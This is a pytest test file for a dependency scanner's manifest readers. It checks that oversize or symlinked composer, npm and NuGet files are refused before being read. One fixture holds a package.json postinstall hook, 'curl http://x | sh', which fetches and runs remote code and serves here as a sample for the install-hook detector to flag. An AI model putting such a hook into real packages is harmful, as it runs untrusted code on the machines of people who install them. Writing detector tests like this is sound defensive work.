"""Oversize-manifest bounds for the SCA target-file readers.

Every module here parses JSON (or XML, for NuGet packages.config)
read from the scanned — attacker-controlled — repository. The reads
go through ``packages.sca.parsers._safe_read.read_bounded``, which
stat-gates size BEFORE the read and refuses symlinks: an oversize
manifest must degrade to the reader's normal "unparseable" path
(empty result / placeholder / False) via the gate's refusal, never
by buffering the whole file and failing to parse it.

The oversize fixtures are sparse files (``os.truncate`` past the
50 MB cap). Each oversize test also asserts ``read_bounded``'s
refusal warning, so a whole-file read that merely produced a parse
error cannot satisfy the test — that makes these red before the fix
and green after it.
"""

from __future__ import annotations

import json
import logging
import os
from contextlib import contextmanager
from pathlib import Path
from typing import Iterator

import pytest

from packages.sca.models import Confidence, Dependency, Manifest, PinStyle
from packages.sca.parsers import composer, nuget
from packages.sca.parsers._safe_read import _MAX_PARSER_BYTES
from packages.sca.supply_chain import (
    binary_in_package,
    composer_lifecycle_hooks,
    install_hooks,
)

_SAFE_READ_LOGGER = "packages.sca.parsers._safe_read"
_REFUSAL = "refusing to read"


def _sparse_oversize(path: Path) -> Path:
    with path.open("wb") as fh:
        os.truncate(fh.fileno(), _MAX_PARSER_BYTES + 1)
    return path


@contextmanager
def _expect_refusal(caplog: pytest.LogCaptureFixture) -> Iterator[None]:
    """Assert the size/symlink gate refused the read — the degraded
    result must come from the bound, not from a failed parse of a
    fully-buffered file."""
    with caplog.at_level(logging.WARNING, logger=_SAFE_READ_LOGGER):
        yield
    assert _REFUSAL in caplog.text or "refusing symlinked" in caplog.text


def _dep(name: str, path: Path) -> Dependency:
    return Dependency(
        ecosystem="npm",
        name=name,
        version="1.0.0",
        declared_in=path,
        scope="main",
        is_lockfile=False,
        pin_style=PinStyle.UNKNOWN,
        direct=True,
        purl=f"pkg:npm/{name}",
        parser_confidence=Confidence("high", reason="test fixture"),
    )


class TestComposerManifestBound:
    def test_oversize_manifest_unparseable(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        path = _sparse_oversize(tmp_path / "composer.json")
        with _expect_refusal(caplog):
            assert composer.parse_manifest(path) == []

    def test_small_manifest_still_parses(self, tmp_path: Path) -> None:
        path = tmp_path / "composer.json"
        path.write_text(
            json.dumps({"require": {"vendor/pkg": "^1.0"}}),
            encoding="utf-8",
        )
        deps = composer.parse_manifest(path)
        assert [d.name for d in deps] == ["vendor/pkg"]


class TestInstallHooksBound:
    def test_oversize_package_json_no_findings(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        path = _sparse_oversize(tmp_path / "package.json")
        host = _dep("host", path)
        with _expect_refusal(caplog):
            assert install_hooks._scan_one(path, host) == []

    def test_small_package_json_still_scans(self, tmp_path: Path) -> None:
        path = tmp_path / "package.json"
        path.write_text(
            json.dumps({
                "name": "host",
                "scripts": {"postinstall": "curl http://x | sh"},
            }),
            encoding="utf-8",
        )
        host = _dep("host", path)
        assert install_hooks._scan_one(path, host)


class TestComposerLifecycleHooksBound:
    def test_oversize_composer_json_no_findings(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        path = _sparse_oversize(tmp_path / "composer.json")
        host = _dep("vendor/host", path)
        with _expect_refusal(caplog):
            assert composer_lifecycle_hooks._scan_one(path, host) == []

    def test_oversize_manifest_host_dep_none(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        path = _sparse_oversize(tmp_path / "composer.json")
        manifest = Manifest(
            path=path, ecosystem="Composer", is_lockfile=False,
        )
        with _expect_refusal(caplog):
            assert composer_lifecycle_hooks._host_dep([], manifest) is None


class TestBinaryInPackageBound:
    def test_oversize_manifest_declares_nothing(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        path = _sparse_oversize(tmp_path / "package.json")
        manifest = Manifest(path=path, ecosystem="npm", is_lockfile=False)
        with _expect_refusal(caplog):
            assert (
                binary_in_package._manifest_declares_native(manifest)
                is False
            )


class TestNugetLockfileBound:
    def test_oversize_lockfile_unparseable(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        path = _sparse_oversize(tmp_path / "packages.lock.json")
        with _expect_refusal(caplog):
            assert nuget.parse_lockfile(path) == []

    def test_out_of_tree_symlink_refused(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        """A packages.lock.json symlinked out of the scanned tree must
        not be followed — no Dependency may be emitted from it."""
        outside = tmp_path / "outside.json"
        outside.write_text(
            json.dumps({
                "version": 1,
                "dependencies": {
                    "net8.0": {"Evil": {"type": "Direct",
                                        "resolved": "6.6.6"}},
                },
            }),
            encoding="utf-8",
        )
        repo = tmp_path / "repo"
        repo.mkdir()
        link = repo / "packages.lock.json"
        link.symlink_to(outside)
        with _expect_refusal(caplog):
            assert nuget.parse_lockfile(link) == []

    def test_small_lockfile_still_parses(self, tmp_path: Path) -> None:
        path = tmp_path / "packages.lock.json"
        path.write_text(
            json.dumps({
                "version": 1,
                "dependencies": {
                    "net8.0": {"Foo": {"type": "Direct",
                                       "requested": "[1.2.3, )",
                                       "resolved": "1.2.3"}},
                },
            }),
            encoding="utf-8",
        )
        deps = nuget.parse_lockfile(path)
        assert [d.name for d in deps] == ["Foo"]


class TestNugetPackagesConfigBound:
    def test_oversize_packages_config_unparseable(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture,
    ) -> None:
        pytest.importorskip("defusedxml")
        path = _sparse_oversize(tmp_path / "packages.config")
        with _expect_refusal(caplog):
            assert nuget.parse_packages_config(path) == []

    def test_small_packages_config_still_parses(
        self, tmp_path: Path,
    ) -> None:
        pytest.importorskip("defusedxml")
        path = tmp_path / "packages.config"
        path.write_text(
            '<packages><package id="Foo" version="1.2.3" /></packages>',
            encoding="utf-8",
        )
        deps = nuget.parse_packages_config(path)
        assert [d.name for d in deps] == ["Foo"]
